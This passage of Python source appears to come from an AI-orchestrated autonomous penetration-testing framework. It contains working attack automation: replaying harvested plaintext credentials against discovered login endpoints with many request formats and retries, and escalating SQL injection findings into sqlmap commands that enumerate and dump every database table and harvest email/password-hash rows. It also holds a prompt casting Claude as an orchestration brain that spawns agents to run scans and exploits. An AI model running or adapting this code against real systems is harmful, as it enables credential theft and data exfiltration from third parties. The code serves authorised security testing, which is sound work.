            self.ctx.add_vulnerability(f)
        if findings:
            logger.info(f"[ModernAPI] added {len(findings)} GraphQL/gRPC/WebSocket findings")

    async def _setup_auth_session(self) -> None:
        self.auth_session = None
        self.multi_auth = None
        try:
            # 1. Multi-role credentials supplied by the UI / CLI.
            creds = getattr(self.ctx, "auth_credentials", None) \
                or [c for c in getattr(self.ctx, "harvested_creds", []) if isinstance(c, dict) and c.get("username")]
            if creds:
                from core.authentication.auth_session import MultiIdentityAuthManager
                multi = MultiIdentityAuthManager(creds)
                await multi.authenticate_all()
                self.multi_auth = multi
                # Expose per-role sessions for cross-role (IDOR / access-control) testing.
                self.ctx.auth_sessions = multi.sessions_map()
                default = multi.default_session()
                if default:
                    self.auth_session = default
                    self.ctx.auth_headers = default.auth_headers()
                    self.ctx.auth_cookies = dict(default.cookies)
                self.ctx.auth_summary = multi.summary()
                self.ctx.log_brain(
                    f"Authenticated {len(multi.summary()['authenticated_roles'])} role session(s)", "auth")
                logger.info(f"[Auth] multi-role sessions ready: {multi.summary()['authenticated_roles']}")

                # Connect real role sessions into the access-control / IDOR replay
                # engine so cross-role authorization tests use live credentials.
                try:
                    from core.authentication.identity_bridge import build_replay_sessions
                    bridge = build_replay_sessions(
                        multi_auth=multi,
                        replay_session_manager=getattr(self, "replay_session_manager", None),
                        identity_manager=self.identity_manager,
                        shared_context=self.ctx,
                    )
                    self.ctx.replay_identity_bridge = bridge
                except Exception as e:
                    logger.warning(f"[Auth] replay-engine bridge failed (non-fatal): {e}")
                return

            # 2. Single .env-configured session.
            from core.authentication.auth_session import AuthSessionManager
            mgr = AuthSessionManager()
            if not mgr.enabled:
                return
            ok = await mgr.authenticate()
            self.auth_session = mgr
            self.ctx.auth_headers = mgr.auth_headers()
            self.ctx.auth_cookies = dict(mgr.cookies)
            self.ctx.auth_summary = mgr.summary()
            if ok and mgr.config.probe_url:
                live = await mgr.is_authenticated()
                logger.info(f"[Auth] session live-check on probe url: {'OK' if live else 'FAILED'}")
            if ok:
                logger.info("[Auth] authenticated session active — post-auth surface unlocked")
                self.ctx.log_brain("Authenticated session established", "auth")
        except Exception as e:
            logger.warning(f"[Auth] session setup failed (non-fatal): {e}")
        # Publish the active auth into the process-wide registry so V2 executors
        # that don't hold a reference to shared_context (see
        # core/execution/executors/generic.py::_auth_headers) can pick it up.
        try:
            from core.execution.executors.auth_registry import set_active_auth
            set_active_auth(
                headers=getattr(self.ctx, "auth_headers", {}) or {},
                cookies=getattr(self.ctx, "auth_cookies", {}) or {},
                sessions=getattr(self.ctx, "auth_sessions", {}) or {},
            )
        except Exception as _e:
            logger.debug(f"[Auth] registry publish failed: {_e}")
        # If we obtained a real live session (from UI creds or .env auth), also
        # persist a proof-of-entry so the UI 'Access Gained' panel shows it.
        try:
            hdrs = getattr(self.ctx, "auth_headers", {}) or {}
            authz = hdrs.get("Authorization", "")
            if authz.startswith("Bearer "):
                from core.database.pg_store import AuthBypassRepo
                from urllib.parse import urlparse as _up
                _base = self.ctx.target
                _host = _up(_base if "://" in _base else f"https://{_base}").netloc
                for cred in (getattr(self.ctx, "auth_credentials", None) or [{}])[:1]:
                    AuthBypassRepo.insert(
                        self._scan_id, _host, "credential_replay",
                        cred.get("login_url", "") or _base,
                        method="POST",
                        username=cred.get("username") or cred.get("email") or "",
                        password=cred.get("password") or "",
                        payload="(operator-supplied credentials)",
                        token=authz[len("Bearer "):],
                        response_status=200,
                        response_snippet="Session established via _setup_auth_session",
                        role=cred.get("role") or "", severity="info",
                    )
        except Exception:
            pass

    async def _auto_login_with_harvested_creds(self) -> None:
        creds = getattr(self.ctx, "harvested_creds", []) or []
        candidates = []
        seen = set()
        for c in creds:
            if not isinstance(c, dict):
                continue
            if c.get("token"):
                continue  # already have a session
            user = c.get("username") or c.get("email")
            pw = c.get("password")
            if not (user and pw):
                continue
            key = f"{user}|{pw}"
            if key in seen:
                continue
            seen.add(key)
            candidates.append(c)
        if not candidates:
            return

        # Discover login endpoints from what we've already seen the app expose.
        base = self.ctx.target
        if not base.startswith(("http://", "https://")):
            base = f"https://{base}"
        from urllib.parse import urlparse as _up
        base_host = _up(base).netloc
        # Generic endpoint discovery — reads everything the crawler + ffuf +
        # captured requests found, classifies as "login" role, falls back to a
        # generic industry-standard list (/login, /signin, /oauth/token, ...)
        # only when nothing was discovered on this target.
        from core.common.endpoint_hints import discover_endpoints
        login_urls = set(discover_endpoints(self.ctx, "login", max_results=20))

        logger.info(f"[AutoLogin] Trying {len(candidates)} plaintext cred(s) against {len(login_urls)} login endpoint(s)")
        import httpx as _httpx, json as _json, base64 as _b64
        from core.database.pg_store import AuthBypassRepo
        from core.execution.executors.auth_registry import set_active_auth

        # Expert mode: long-backoff retry so a transient 503/timeout doesn't
        # declare valid creds dead. Retries spread over ~4 minutes total.
        RETRY_DELAYS = [0, 2, 5, 15, 45, 120]  # seconds
        BODY_SHAPES = [
            ("json", {"email": "{U}", "password": "{P}"}),
            ("json", {"username": "{U}", "password": "{P}"}),
            ("json", {"login": "{U}", "password": "{P}"}),
            ("json", {"user": "{U}", "pass": "{P}"}),
            ("json", {"identifier": "{U}", "password": "{P}"}),
            ("json", {"id": "{U}", "pwd": "{P}"}),
            ("form", "email={U}&password={P}"),
            ("form", "username={U}&password={P}"),
            ("form", "j_username={U}&j_password={P}"),
        ]
        import asyncio as _asyncio
        async with _httpx.AsyncClient(follow_redirects=True, timeout=30, verify=False) as client:
            for cred in candidates:
                user = cred.get("username") or cred.get("email")
                pw = cred.get("password")
                logged_in = False
                for lurl in login_urls:
                    if logged_in:
                        break
                    for shape, tmpl in BODY_SHAPES:
                        if logged_in:
                            break
                        for delay in RETRY_DELAYS:
                            if delay:
                                await _asyncio.sleep(delay)
                            try:
                                if shape == "json":
                                    body = {k: (v.replace("{U}", str(user)).replace("{P}", str(pw))
                                                if isinstance(v, str) else v)
                                            for k, v in tmpl.items()}
                                    resp = await client.post(lurl, json=body)
                                else:
                                    from urllib.parse import quote as _q
                                    body_s = tmpl.replace("{U}", _q(str(user))).replace("{P}", _q(str(pw)))
                                    resp = await client.post(
                                        lurl, content=body_s,
                                        headers={"Content-Type": "application/x-www-form-urlencoded"})
                                    body = body_s
                            except Exception:
                                continue
                            # Treat transient errors as retryable
                            if resp.status_code in (429, 500, 502, 503, 504):
                                logger.debug(f"[AutoLogin] {user}@{lurl} shape={shape} -> {resp.status_code}, retrying")
                                continue
                            if resp.status_code not in (200, 201):
                                break  # non-transient failure — try next body shape
                        # Extract token
                        token = None
                        try:
                            j = resp.json()
                            if isinstance(j, dict):
                                auth = j.get("authentication") or {}
                                token = (auth.get("token") if isinstance(auth, dict) else None) \
                                    or j.get("access_token") or j.get("token") or j.get("id_token")
                        except Exception:
                            pass
                        if not token or not isinstance(token, str) or not token.startswith("eyJ"):
                            continue
                        # Decode JWT for role
                        role = ""
                        try:
                            p = token.split(".")[1]
                            p += "=" * (-len(p) % 4)
                            payload = _json.loads(_b64.urlsafe_b64decode(p).decode("utf-8", "ignore"))
                            data = payload.get("data") or payload
                            if isinstance(data, dict):
                                role = data.get("role", "")
                        except Exception:
                            pass
                        # Attach token, publish, persist
                        cred["token"] = token
                        cred["role"] = role
                        cred["login_url"] = lurl
                        hdrs = dict(getattr(self.ctx, "auth_headers", {}) or {})
                        hdrs["Authorization"] = f"Bearer {token}"
                        self.ctx.auth_headers = hdrs
                        try:
                            set_active_auth(
                                headers=hdrs,
                                cookies=getattr(self.ctx, "auth_cookies", {}) or {},
                                sessions=getattr(self.ctx, "auth_sessions", {}) or {},
                            )
                        except Exception:
                            pass
                        try:
                            payload_str = _json.dumps(body) if isinstance(body, dict) else str(body)
                            AuthBypassRepo.insert(
                                self._scan_id, _up(lurl).netloc or base_host,
                                "credential_replay", lurl,
                                method="POST", username=user, password=pw,
                                payload=payload_str,
                                token=token, response_status=resp.status_code,
                                response_snippet=(resp.text or "")[:600],
                                role=role,
                                severity=("critical" if "admin" in role.lower() else "high"),
                            )
                        except Exception:
                            pass
                        logger.info(f"[AutoLogin] {user} -> {lurl} (shape={shape}) = 200 (role={role or '?'}) — token attached")
                        logged_in = True
                        break  # break retry loop

    async def _escalate_sqli_to_dump(self) -> None:
        vulns = getattr(self.ctx, "vulnerabilities", []) or []
        sqli_targets = []
        seen = set()
        for v in vulns:
            vd = v if isinstance(v, dict) else getattr(v, "__dict__", {})
            vtype = str(vd.get("type", "")).lower()
            title = str(vd.get("title", "")).lower()
            if "sql" not in vtype and "sql injection" not in title:
                continue
            url = vd.get("location") or vd.get("target") or vd.get("url", "")
            if not url or not url.startswith(("http://", "https://")):
                continue
            key = url.split("?")[0]
            if key in seen:
                continue
            seen.add(key)
            sqli_targets.append(url)
        if not sqli_targets:
            return
        logger.info(f"[SQLiDump] Escalating {len(sqli_targets)} confirmed SQLi endpoint(s) to sqlmap --dump")
        try:
            from core.tools.kali_executor import KaliExecutor
            executor = KaliExecutor()
        except Exception:
            return
        added_creds = 0
        # Expert mode, target-agnostic: enumerate DBs + tables first, then
        # dump every discovered table (no hardcoded table names). Any table
        # that looks like it holds credentials/PII surfaces creds; the rest
        # populate post_exploit_data as intelligence.
        import re as _re_local
        for url in sqli_targets:
            try:
                enum_cmd = (f"sqlmap -u {url!r} --batch --level=5 --risk=3 "
                            f"--random-agent --timeout=30 --retries=2 --technique=BEUSTQ "
                            f"--dbs --tables --threads=4")
                enum_res = await executor.execute(enum_cmd, timeout=300)
                enum_out = str(enum_res.get("stdout") or "") if isinstance(enum_res, dict) else str(enum_res)
                # Parse sqlmap's tables output — lines like `| users |` or `[*] users`
                discovered_tables = set()
                for m in _re_local.finditer(r"^\s*\|\s*([A-Za-z_][A-Za-z0-9_]{1,63})\s*\|", enum_out, _re_local.MULTILINE):
                    discovered_tables.add(m.group(1))
                for m in _re_local.finditer(r"^\s*\[\*\]\s*([A-Za-z_][A-Za-z0-9_]{1,63})\s*$", enum_out, _re_local.MULTILINE):
                    discovered_tables.add(m.group(1))
                # No tables enumerated? Fall back to --dump-all (sqlmap picks
                # them itself) so we still exfil something without guessing.
                if not discovered_tables:
                    fallback_cmd = (f"sqlmap -u {url!r} --batch --level=5 --risk=3 "
                                    f"--random-agent --timeout=30 --retries=2 --technique=BEUSTQ "
                                    f"--dump-all --exclude-sysdbs --threads=4")
                    await executor.execute(fallback_cmd, timeout=600)
                    continue
                logger.info(f"[SQLiDump] Enumerated {len(discovered_tables)} table(s) on {url}: "
                            f"{sorted(discovered_tables)[:10]}...")
                for table in sorted(discovered_tables):
                    cmd = (f"sqlmap -u {url!r} --batch --level=5 --risk=3 "
                           f"--random-agent --timeout=30 --retries=2 --technique=BEUSTQ "
                           f"-T {table} --dump --threads=4")
                    res = await executor.execute(cmd, timeout=420)
                    out = str(res.get("stdout") or "") if isinstance(res, dict) else str(res)
                    if not out or "no columns" in out.lower():
                        continue
                    # Parse table rows: sqlmap dumps look like `| email | password |`
                    import re as _re
                    row_re = _re.compile(r'\|\s*([^|]*@[^|]*)\s*\|\s*([a-f0-9]{32,128}|\$2[aby]\$[^|\s]+)\s*\|')
                    for m in row_re.finditer(out):
                        email, pw = m.group(1).strip().lower(), m.group(2).strip()
                        hc = list(getattr(self.ctx, "harvested_creds", []) or [])
                        hc.append({
                            "username": email, "email": email, "password": pw,
                            "source": "sqlmap_dump", "table": table, "sqli_url": url,
                        })
                        self.ctx.harvested_creds = hc
                        added_creds += 1
                        # Persist proof-of-entry row so the UI's "Access Gained"
                        # panel shows sqlmap-dumped creds as a bypass event.
                        try:
                            from core.database.pg_store import AuthBypassRepo
                            from urllib.parse import urlparse as _up
                            _host = _up(url).netloc
                            AuthBypassRepo.insert(
                                self._scan_id, _host, "sqlmap_dump", url,
                                method="EXFIL", username=email, password="",
                                payload=f"sqlmap -u {url} -T {table} --dump",
                                token="", response_status=200,
                                response_snippet=f"Row from {table}: email={email}, hash={pw[:60]}",
                                role="", severity="critical",
                            )
                        except Exception:
                            pass
                    if added_creds:
                        break
            except Exception as e:
                logger.debug(f"[SQLiDump] {url} failed: {e}")
                continue
        if added_creds:
            logger.info(f"[SQLiDump] Extracted {added_creds} credentials — feeding auth chain")

    def _record_critic_outcomes(self, findings: list) -> None:
        if not getattr(self, "reward_policy", None) or not findings:
            return
        counts = self.reward_policy.record_finding_outcomes(findings)
        logger.info(f"[RewardPolicy] outcomes recorded: {counts}")

    def _summarize_context(self) -> str:

        lines = []
        
        # Target
        lines.append(f"Target: {self.ctx.target}")
        
        # Subdomains
        subs = self.ctx.get_subdomains()
        if subs:
            lines.append(f"Discovered subdomains: {len(subs)} ({', '.join(subs[:3])})")
        else:
            lines.append("Subdomains: None discovered yet")
        
        # Ports
        ports_data = self.ctx.data.get("ports", {})
        if ports_data:
            all_ports = []
            for host, port_list in ports_data.items():
                all_ports.extend(port_list)
            lines.append(f"Open ports found: {len(set(all_ports))} ({', '.join(map(str, sorted(set(all_ports))[:5]))})")
        else:
            lines.append("Open ports: None scanned yet")
        
        # Technologies
        techs_by_host = self.ctx.data.get("technologies", {})
        if techs_by_host:
            all_techs = []
            for host, tech_list in techs_by_host.items():
                all_techs.extend(tech_list)
            if all_techs:
                lines.append(f"Technologies identified: {', '.join(set(all_techs)[:3])}")
        
        # Endpoints
        endpoints = self.ctx.get_endpoints()
        if endpoints:
            lines.append(f"Web endpoints discovered: {len(endpoints)} ({', '.join(endpoints[:3])})")
        
        # Vulnerabilities
        vulns = self.ctx.data.get("vulnerabilities", [])
        if vulns:
            lines.append(f"Vulnerabilities found: {len(vulns)}")
            for vuln in vulns[:2]:
                severity = vuln.get("severity", "UNKNOWN")
                title = vuln.get("title", "Unknown")
                lines.append(f"  - {title} ({severity})")
        else:
            lines.append("Vulnerabilities: None identified yet")
        
        return "\n".join(lines)

    def _build_agent_context(self, keys: list) -> str:
        
        if not keys:
            return f"Target: {self.ctx.target}\nObjective: Complete assigned task"
        
        lines = []
        for key in keys:
            if key == "target":
                lines.append(f"Target: {self.ctx.target}")
            elif key == "subdomains":
                subs = self.ctx.get_subdomains()
                if subs:
                    lines.append(f"Subdomains ({len(subs)}): {', '.join(subs[:5])}")
            elif key == "ports":
                ports_data = self.ctx.data.get("ports", {})
                if ports_data:
                    lines.append(f"Open ports: {list(ports_data.keys())}")
            elif key == "technologies":
                techs = self.ctx.get_technologies(self.ctx.target)
                if techs:
                    lines.append(f"Technologies: {', '.join(techs[:3])}")
            elif key == "endpoints":
                eps = self.ctx.get_endpoints()
                if eps:
                    lines.append(f"Endpoints ({len(eps)}): {eps[:3]}")
            elif key == "vulnerabilities":
                vulns = self.ctx.data.get("vulnerabilities", [])
                if vulns:
                    lines.append(f"Known vulns ({len(vulns)}): {[v.get('title', '?') for v in vulns[:2]]}")
        
        return "\n".join(lines) if lines else f"Target: {self.ctx.target}"

    async def _spawn_and_run_agent(self, spec: Dict):
        from core.orchestration.dynamic_agent import DynamicAgent
        
        objective = spec.get("objective", "")
        tools = spec.get("tools", [])
        context_keys = spec.get("context_keys", [])
        max_steps = spec.get("max_steps", 10)
        
        logger.info(f"  Spawning agent: {objective}")
        
        # Build agent context from shared context
        agent_context = self._build_agent_context(context_keys)
        
        # Spawn agent
        agent_id = f"AGENT-{len(self.spawner.agents) + 1:03d}"
        
        agent = DynamicAgent(
            agent_id=agent_id,
            objective=objective,
            tool_registry=self.tools,
            shared_context=self.ctx,
            agent_context=agent_context,
            allowed_tools=tools,
            max_steps=max_steps
        )
        
        # Run agent
        logger.info(f"  Running {agent_id}...")
        result = await agent.execute()
        
        # Handle result
        if result.get("status") == "success":
            logger.info(f"  ✓ {agent_id} succeeded")
            self.ctx.add_event(f"{agent_id}: Success", result.get("results", {}))
        else:
            logger.warning(f"  ✗ {agent_id} failed: {result.get('reason', 'unknown')}")
            self.ctx.add_event(f"{agent_id}: Failed", result)

    async def _spawn_multiple_agents(self, specs: list):
        from core.orchestration.dynamic_agent import DynamicAgent
        
        logger.info(f"  Spawning {len(specs)} agents in parallel...")
        
        agents = []
        for i, spec in enumerate(specs):
            objective = spec.get("objective", "")
            tools = spec.get("tools", [])
            context_keys = spec.get("context_keys", [])
            max_steps = spec.get("max_steps", 8)
            
            # Build context
            agent_context = self._build_agent_context(context_keys)
            
            # Create agent
            agent_id = f"AGENT-{len(agents) + 1:03d}"
            agent = DynamicAgent(
                agent_id=agent_id,
                objective=objective,
                tool_registry=self.tools,
                shared_context=self.ctx,
                agent_context=agent_context,
                allowed_tools=tools,
                max_steps=max_steps
            )
            agents.append(agent)
        
        # Run all in parallel
        logger.info(f"  Running {len(agents)} agents...")
        results = await asyncio.gather(*[agent.execute() for agent in agents])
        
        # Log results
        for agent, result in zip(agents, results):
            if result.get("status") == "success":
                logger.info(f"  ✓ {agent.agent_id} succeeded")
            else:
                logger.warning(f"  ✗ {agent.agent_id} {result.get('reason', 'failed')}")

    def _build_brain_prompt(self, phase: str, iteration: int) -> str:
        
        context = self._summarize_context()
        
        prompt = f"""You are an AUTONOMOUS PENTESTING ORCHESTRATION BRAIN.

⚠️  CRITICAL: You are Claude, an LLM. You orchestrate agents that execute tools.
You do NOT execute tools yourself. You DECIDE what agents should do.

Target: {self.ctx.target}
Phase: {phase.upper()} (Iteration {iteration})

CURRENT STATE:
{context}

WHAT AGENTS NEED (examples):

For Subdomain Discovery:
  objective: "Find all subdomains of target domain"
  tools: ["amass", "subfinder", "dig", "whois"]

For Port Scanning:
  objective: "Scan for open ports and services"
  tools: ["nmap", "masscan"]

For Tech Stack Detection:
  objective: "Identify web server, frameworks, CMS"
  tools: ["httpx", "whatweb", "wafw00f"]

For Directory Discovery:
  objective: "Find hidden directories and files"
  tools: ["gobuster", "feroxbuster", "ffuf"]

For JavaScript Analysis:
  objective: "Extract endpoints and secrets from JS"
  tools: ["curl", "strings"]

For Vulnerability Scanning:
  objective: "Scan for CVEs and known vulnerabilities"
  tools: ["nuclei", "nessus"]

YOUR ROLE:
1. Look at current state
2. Identify what's missing
3. Decide which tools would help
4. Spawn agent with objective + tools
5. Agent executes tools, you don't

PHASE RULES:
RECON: Discover targets (subdomains, ports, tech, endpoints)
ANALYZE: Find vulnerabilities
EXPLOIT: Execute vulnerabilities
REPORT: Compile findings

RESPONSE: JSON only (no other text)

Single agent:
{{
  "thinking": "why this helps fill the gap",
  "action": "spawn_agent",
  "agent_spec": {{
    "objective": "specific goal for agent",
    "tools": ["tool1", "tool2", "tool3"],
    "context_keys": ["target", "existing_data"],
    "max_steps": 8
  }}
}}

Phase complete:
{{
  "thinking": "why we have enough information",
  "action": "phase_complete"
}}

CRITICAL RULES:
✓ You orchestrate. Agents execute.
✓ Give agents both objective AND tools
✓ Only spawn agents that address gaps
✓ JSON only response"""
        
        return prompt

    def _active_frameworks(self):
        try:
            from core.common.config import get_config
            fw = get_config().config.get("COMPLIANCE_FRAMEWORKS")
            if fw:
                return fw
        except Exception:       # noqa: BLE001
            pass
        return available_frameworks()

    def _validate_findings(self, ts: str):
        # Work on shallow copies so we don't mutate the canonical vuln list.
        findings = [dict(v) for v in self.ctx.vulnerabilities]

        # 1. Confidence gate — LOW confidence -> needs_review (not main report).
        gated = confidence_gate(findings)
        reported, needs_review = gated["report"], gated["needs_review"]

        # 2. Cross-scan dedup — suppress recurring-unchanged, flag new/resolved.
        try:
            dedup = DedupStore()
            dd = dedup.process_scan(reported, scan_id=ts, include_recurring=True)
            reported = dd["report"]
            suppressed_findings = dd.get("suppressed_findings", [])
            
            # Explicit logging for suppressed findings
            for sf in suppressed_findings:
                reason = "recurring_deduplicated_by_fingerprint"
                logger.info(f"SUPPRESSED: {sf.get('id', 'unknown')} reason={reason}")
                
            dedup_summary = {
                "suppressed_recurring": dd["suppressed"],
                "suppressed_findings": [f.get("title") or f.get("name") or f.get("type") for f in suppressed_findings],
                "resolved": len(dd["resolved"]),
                "reported": len(reported)
            }
        except Exception as e:      # noqa: BLE001
            logger.warning(f"[report] dedup failed: {e}")
            dedup_summary = {"suppressed_recurring": 0, "suppressed_findings": [], "resolved": 0,
                             "reported": len(reported), "error": str(e)}

        logger.info(f"[report] findings: {len(reported)} reported, "
                    f"{len(needs_review)} need review, "
                    f"{dedup_summary['suppressed_recurring']} recurring suppressed")
        return {"reported": reported, "needs_review": needs_review,
                "dedup": dedup_summary}

    async def _generate_report(self):
        # Attack-chain intelligence: compose distinct exploitation paths from
        # the scan artefacts (SQLi→dump→crack→login→IDOR chains, etc.)
        try:
            from core.reporting.chain_intelligence import synthesize_chains
            await synthesize_chains(self._scan_id)
        except Exception as _e:
            logger.warning(f"[ChainIntel] synthesis failed (non-fatal): {_e}")

        """LLM generates final report.

        Token-savings: prefer the LLM's OWN phase-by-phase summaries recorded
        during the scan (scan_llm_memory) over dumping raw context. Uses the
        SMALL tier because this is prose summarisation, not reasoning — the
        LARGE reasoning-model tier tripled cost with no quality gain.
        """
        # 1. Reuse recorded per-phase summaries the scan-time LLM produced
        try:
            from core.database.pg_store import LLMMemoryRepo
            mem_rows = LLMMemoryRepo.get_by_scan(self._scan_id, kind="summary", limit=30)
        except Exception:
            mem_rows = []
        if mem_rows:
            memory_txt = "\n\n".join(f"### {m.get('phase','phase')}\n{(m.get('content') or '').strip()}"
                                       for m in mem_rows if (m.get("content") or "").strip())
        else:
            memory_txt = ""
        # 2. Compact fact snapshot — just counts + top vuln titles (no full details)
        v_list = self.ctx.vulnerabilities or []
        sev_counts: Dict[str, int] = {}
        for v in v_list:
            s = (v.get("severity") or "INFO").upper()
            sev_counts[s] = sev_counts.get(s, 0) + 1
        top_vulns = [v.get("title", "") for v in v_list
                     if (v.get("severity") or "").upper() in ("CRITICAL", "HIGH")][:15]
        fact_snapshot = {
            "target": self.ctx.target,
            "severity_counts": sev_counts,
            "top_high_critical": top_vulns,
            "attack_chains_count": len(self.ctx.attack_chains or []),
            "exploit_results_count": len(self.ctx.exploit_results or []),
            "harvested_creds_count": len(self.ctx.harvested_creds or []),
        }
        # 3. SMALL tier — this is summarisation, not reasoning
        exec_summary = await self.llm.generate(
            "Write a 3-paragraph professional executive summary for this pentest. "
            "Cover: overall risk posture, key finding categories, recommendations. "
            "Use the scan-time analyst notes as your primary source; the fact "
            "snapshot is only for citing exact counts.\n\n"
            f"SCAN-TIME ANALYST NOTES:\n{memory_txt or '(no phase summaries recorded)'}\n\n"
            f"FACT SNAPSHOT: {json.dumps(fact_snapshot, default=str)}\n\n"
            "Be concise (3 paragraphs max, ~250 words total).",
            tier=TaskTier.SMALL,
            max_tokens=800,
        )

        # ── Finding validation + compliance mapping (production-grade layer) ──
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        validated = self._validate_findings(ts)
        frameworks = self._active_frameworks()
        try:
            compliance_summary = ComplianceReporter(frameworks).build(
                self.ctx.vulnerabilities)
        except Exception as e:      # noqa: BLE001
            logger.warning(f"[report] compliance mapping failed: {e}")
            compliance_summary = {"active_frameworks": frameworks, "error": str(e)}

        # Build report
        report = {
            "metadata": {
                "title": f"Penetration Test Report - {self.ctx.target}",
                "target": self.ctx.target,
                "timestamp": datetime.now().isoformat(),
                "duration_seconds": (datetime.now() - self.start_time).total_seconds(),
                "agents_used": len(self.ctx.agents_spawned),
                "token_usage": self._get_token_usage(),
            },
            "executive_summary": exec_summary,
            "scope": self.ctx.scope,
            "context": self._build_recon_context(),
            "vulnerabilities": validated["reported"],
            "vulnerabilities_all": self.ctx.vulnerabilities,
            "needs_review": validated["needs_review"],
            "dedup": validated["dedup"],
            "compliance": compliance_summary,
            "attack_chains": self.ctx.attack_chains,
            "exploit_results": self.ctx.exploit_results,
            "post_exploitation": (
                self.post_exploit.to_dict() if self.post_exploit else {
                    "privesc_findings": self.ctx.privesc_findings,
                    "harvested_creds": self.ctx.harvested_creds,
                    "lateral_plan": self.ctx.lateral_plan,
                    "persistence_plan": self.ctx.persistence_plan,
                    "mitre_mappings": self.ctx.mitre_mappings,
                }
            ),
            "technical_data": {
                "subdomains": self.ctx.subdomains,
                "ips": self.ctx.ips,
                "ports": self.ctx.ports,
                "technologies": self.ctx.technologies,
                "endpoints": self.ctx.endpoints,
                "directories": self.ctx.directories,
                "headers": self.ctx.headers,
                "ssl_info": self.ctx.ssl_info,
                "secrets": self.ctx.secrets,
                "crawled_pages": self.ctx.crawled_pages,
                "captured_requests": self.ctx.captured_requests,
            },
            "automation": self.automation.to_dict(),
            "exploit_consent": get_consent().summary(),
            "remediation": self.automation.remediation_report(),
            "metrics": self.metrics.snapshot(),
            "scheduled_scan": AutomationEngine.schedule_config(self.ctx.target),
            "brain_log": self.ctx.brain_log,
            "agents": self.ctx.agents_spawned,
        }

        # Generate automated exploit POC reproduction scripts (Python, cURL, Markdown).
        # PoCs persist to Postgres (scan_artifacts) so the UI can render them; disk
        # writes only happen when REPORTS_ENABLED=1.
        try:
            # Ensure the shared_context knows its scan_id so POCGenerator can persist to DB
            try:
                setattr(self.ctx, "scan_id", getattr(self, "_scan_id", None) or getattr(self.ctx, "scan_id", None))
            except Exception:
                pass
            from core.common.reports_config import reports_enabled as _re
            poc_files = POCGenerator.generate(self.ctx,
                                              output_dir=str(self.report_dir) if _re() else None)
            if poc_files:
                report["poc_artifacts"] = poc_files
                logger.info(f"POC reproduction scripts generated: {poc_files}")
        except Exception as pe:
            logger.warning(f"POC generation failed (non-fatal): {pe}")

        # Save  (ts computed above, shared with the validation/dedup scan_id)
        report_path = self.report_dir / f"pentest_{ts}.json"
        with open(report_path, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, default=str, ensure_ascii=False)
        logger.info(f"Report saved: {report_path}")

        # Persist to PostgreSQL under the canonical run id (never the wall-clock
        # timestamp) so this run's rows are isolated from every other run.
        try:
            from core.database.pg_store import ScanRepo, VulnRepo
            run_id = self._scan_id
            ScanRepo.create(run_id, self.ctx.target, self.tier)
            ScanRepo.save_report(run_id, report)
            VulnRepo.bulk_insert(run_id, validated["reported"])
        except Exception as pg_err:
            logger.warning(f"[report] PG persist failed (non-fatal): {pg_err}")

        # Enterprise HTML/PDF report + final dashboard
        try:
            self.reporter.active_frameworks = frameworks
            paths = self.reporter.generate(executive_summary=exec_summary,
                                           stem=f"pentest_{ts}")
            logger.info(f"Enterprise report: {paths.get('html')}"
                        + (f" | {paths['pdf']}" if paths.get("pdf") else ""))
            self.metrics.write_dashboard()
        except Exception as e:      # noqa: BLE001
            logger.error(f"Enterprise report generation failed: {e}")

        # Save shared context as backup
        ctx_path = self.report_dir / f"context_{ts}.json"
        self.ctx.save(str(ctx_path))
        logger.info(f"Context saved: {ctx_path}")

    def _get_token_usage(self) -> Dict[str, Any]:
        try:
            from agents.llm_harness_adapter import get_llm
            harness = get_llm()
            if harness and hasattr(harness, "budget"):
                stats = harness.budget.stats()
                total_input = sum(r.input_tokens for r in harness.budget.requests)
                total_output = sum(r.output_tokens for r in harness.budget.requests)
                stats["input_tokens"] = total_input
                stats["output_tokens"] = total_output
                return stats
        except Exception:
            pass
        return {}

    def plan_reconnaissance(self, state: ExecutionState) -> BrainDecision:
        
        # What do we already know?
        hosts_known = len(self.knowledge_store.get_by_type("host"))
        ports_known = len(self.knowledge_store.get_by_type("port"))
        services_known = len(self.knowledge_store.get_by_type("service"))
        
        # What should we investigate?
        tasks = []
        
        # Stage 1: DNS if no hosts known
        if hosts_known == 0:
            tasks.append(TaskSpec(
                objective=f"Enumerate DNS records for {self.target}",
                capability=CapabilityType.DNS_ENUMERATION,
                inputs={"domain": self.target},
                context_requirements=["hosts"],
                success_criteria=[
                    SuccessCriterion(
                        criterion_type=SuccessCriterionType.KNOWLEDGE_EXISTS,
                        entity_type="host"
                    )
                ],
                timeout_seconds=300,
                max_steps=5,
            ))
        
        # Stage 2: Port scan discovered hosts
        elif hosts_known > 0 and ports_known == 0:
            tasks.append(TaskSpec(
                objective="Scan discovered hosts for open ports",
                capability=CapabilityType.PORT_SCANNING,
                inputs={"targets": [h["host"] for h in self.context_resolver.resolve_hosts(self.authorized_scope)]},
                context_requirements=["hosts"],
                success_criteria=[
                    SuccessCriterion(
                        criterion_type=SuccessCriterionType.KNOWLEDGE_EXISTS,
                        entity_type="port"
                    )
                ],
                timeout_seconds=600,
                max_steps=8,
            ))
        
        # Stage 3: Technology fingerprinting
        elif ports_known > 0 and services_known == 0:
            tasks.append(TaskSpec(
                objective="Fingerprint technologies on discovered services",
                capability=CapabilityType.TECHNOLOGY_FINGERPRINTING,
                inputs={"ports": self.context_resolver.resolve_ports()},
                context_requirements=["ports"],
                success_criteria=[
                    SuccessCriterion(
                        criterion_type=SuccessCriterionType.KNOWLEDGE_EXISTS,
                        entity_type="technology"
                    )
                ],
                timeout_seconds=300,
                max_steps=8,
            ))
        
        else:
            # Recon complete
            return BrainDecision(
                action=BrainDecisionAction.COMPLETE,
                thought="Reconnaissance phase complete - hosts, ports, technologies discovered",
                reason="Sufficient reconnaissance data collected"
            )
        
        if tasks:
            return BrainDecision(
                action=BrainDecisionAction.SPAWN_AGENTS,
                thought=f"Spawning {len(tasks)} reconnaissance task(s)",
                tasks=tasks,
            )
        
        return BrainDecision(
            action=BrainDecisionAction.WAIT,
            thought="Waiting for reconnaissance tasks to complete",
            wait_seconds=5,
        )

    def make_decision(self, state: ExecutionState) -> BrainDecision:
        
        # Safety check
        if self.execution_count >= self.max_iterations:
            logger.warning("[Brain] Max iterations reached, completing")
            return BrainDecision(
                action=BrainDecisionAction.COMPLETE,
                reason="Max execution iterations reached"
            )
        
        self.execution_count += 1
        
        # Check if all objectives completed
        completed_count = len(state.tasks_completed)
        failed_count = len(state.tasks_failed)
        blocked_count = len(state.tasks_blocked)
        running_count = len(state.tasks_running)
        
        logger.info(f"[Brain] Iteration {self.execution_count}: "
                    f"completed={completed_count}, running={running_count}, "
